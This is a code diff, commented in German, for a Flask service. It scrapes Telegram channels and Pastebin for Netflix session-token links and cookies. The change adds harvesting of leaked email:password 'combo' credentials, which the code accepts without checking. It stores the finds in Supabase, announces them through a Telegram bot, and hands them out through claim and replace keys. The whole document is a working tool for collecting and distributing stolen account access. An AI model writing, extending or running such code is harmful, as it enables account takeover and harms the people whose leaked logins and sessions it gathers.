@@ -30,12 +30,14 @@ def get_headers():
 
 TELEGRAM_CHANNELS = ["freetohell", "Crackers_Official", "internettweaksforum", "netflix_disney_hotstar_nord", "mrplan254", "DARKNET240", "PremiumAccounts_Free", "Combos", "Netflix_Cookies", "Spotify_Premium", "FreeNetflixDaily", "Cookies_Netflix", "Netflix_Account_Drop", "Free_Account_Drop", "NetflixCookiesFree", "NetflixFreebies", "accountsharing", "streamingpartners", "Netflix_Drops", "Spotify_Accounts", "rtl_plus_free", "disney_plus_accounts", "crunchyroll_free"]
 
-PATTERN = re.compile(r'(https?://(?:www\.)?netflix\.com/(?:tv2|browse)\?nftoken=[^\s<"]+)', re.IGNORECASE)
+# Sucht nach Links UND E-Mail:Passwort
+PATTERN = re.compile(r'(https?://(?:www\.)?netflix\.com/(?:tv2|browse)\?nftoken=[^\s<"]+)|([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}:[^\s]+)', re.IGNORECASE)
 
 def clean_link(link):
     return link.replace('</a>', '').replace('<br>', '').replace('"', '').strip()
 
 def test_link(link):
+    if not link.startswith('http'): return True # Combos werden blind akzeptiert
     try:
         headers = {'User-Agent': 'Mozilla/5.0'}
         r = requests.get(link, headers=headers, allow_redirects=False, timeout=5)
@@ -49,16 +51,15 @@ def scan_telegram(channel):
     try:
         r = requests.get(f"https://t.me/s/{channel}", timeout=5, headers={'User-Agent': 'Mozilla/5.0'})
         for m in PATTERN.findall(r.text):
-            link = clean_link(m)
-            if link and test_link(link): 
-                found.append(link)
+            link = clean_link(m[0]) if m[0] else m[1]
+            if link and test_link(link): found.append(link)
     except Exception: pass 
     return found
 
 def scan_duckduckgo():
     found = []
     try:
-        q = 'site:pastebin.com "nftoken="'
+        q = 'site:pastebin.com "nftoken=" OR "NetflixId="'
         r = requests.get(f"https://html.duckduckgo.com/html/?q={q}", timeout=10, headers={'User-Agent': 'Mozilla/5.0'})
         soup = BeautifulSoup(r.text, 'html.parser')
         for a in soup.select('.result__a')[:5]:
@@ -68,9 +69,8 @@ def scan_duckduckgo():
                 raw_r = requests.get(raw_url, timeout=5)
                 if raw_r.status_code == 200:
                     for m in PATTERN.findall(raw_r.text):
-                        link = clean_link(m)
-                        if link and test_link(link): 
-                            found.append(link)
+                        link = clean_link(m[0]) if m[0] else m[1]
+                        if link and test_link(link): found.append(link)
     except Exception: pass
     return found
 
@@ -87,10 +87,11 @@ def grabber_loop():
             for item in found_raw:
                 check = requests.get(f"{SUPABASE_URL}/rest/v1/keys?data=eq.{item}", headers=get_headers())
                 if check.status_code == 200 and not check.json():
-                    meta = {"email": "NFToken Link", "password": None, "country": "Unknown", "plan": "Premium", "profiles": []}
+                    platform = "combo" if ':' in item and '@' in item else "netflix"
+                    meta = {"email": "Login" if platform == "combo" else "Link", "password": None, "country": "Unknown", "plan": "Premium", "profiles": []}
                     newKey = 'CLM-' + os.urandom(4).hex().upper()
-                    requests.post(f"{SUPABASE_URL}/rest/v1/keys", headers=get_headers(), json={"key": newKey, "data": item, "metadata": meta, "used": False, "platform": "netflix"})
-                    try: requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", data={"chat_id": CHAT_ID, "text": f"🚨 **NEUER LINK!**\n\n{newKey}", "parse_mode": "Markdown"})
+                    requests.post(f"{SUPABASE_URL}/rest/v1/keys", headers=get_headers(), json={"key": newKey, "data": item, "metadata": meta, "used": False, "platform": platform})
+                    try: requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", data={"chat_id": CHAT_ID, "text": f"🚨 **NEUER FUND!**\n\n{newKey}", "parse_mode": "Markdown"})
                     except: pass
         time.sleep(60)
 
@@ -118,25 +119,26 @@ def claim():
     r = requests.get(f"{SUPABASE_URL}/rest/v1/keys?key=eq.{key}&data=not.is.null", headers=get_headers())
     if r.status_code == 200 and r.json():
         k = r.json()[0]
-        return jsonify({"success": True, "data": k['data'], "platform": "netflix"})
+        return jsonify({"success": True, "data": k['data'], "platform": k['platform']})
     return jsonify({"success": False, "msg": "Key ungültig oder nicht gefunden!"})
 
 @app.route('/api/replace', methods=['POST'])
 def replace():
     data = request.json
     old_key = data.get('key')
+    current_platform = data.get('platform', 'netflix') # Merkt sich, ob es ein Link oder Login war
     
-    r = requests.get(f"{SUPABASE_URL}/rest/v1/keys?data=not.is.null&used=eq.false&platform=eq.netflix&key=neq.{old_key}&limit=1", headers=get_headers())
+    r = requests.get(f"{SUPABASE_URL}/rest/v1/keys?data=not.is.null&used=eq.false&platform=eq.{current_platform}&key=neq.{old_key}&limit=1", headers=get_headers())
     if r.status_code == 200 and r.json():
         new_acc = r.json()[0]
         new_link = new_acc['data']
         
-        requests.patch(f"{SUPABASE_URL}/rest/v1/keys?key=eq.{old_key}", headers=get_headers(), json={"data": new_link})
+        requests.patch(f"{SUPABASE_URL}/rest/v1/keys?key=eq.{old_key}", headers=get_headers(), json={"data": new_link, "platform": current_platform})
         requests.delete(f"{SUPABASE_URL}/rest/v1/keys?id=eq.{new_acc['id']}", headers=get_headers())
         
         return jsonify({"success": True, "data": new_link})
     
-    return jsonify({"success": False, "msg": "Keine Ersatz-Links verfügbar!"})
+    return jsonify({"success": False, "msg": "Keine Ersatz-Accounts verfügbar!"})
 
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 10000)))
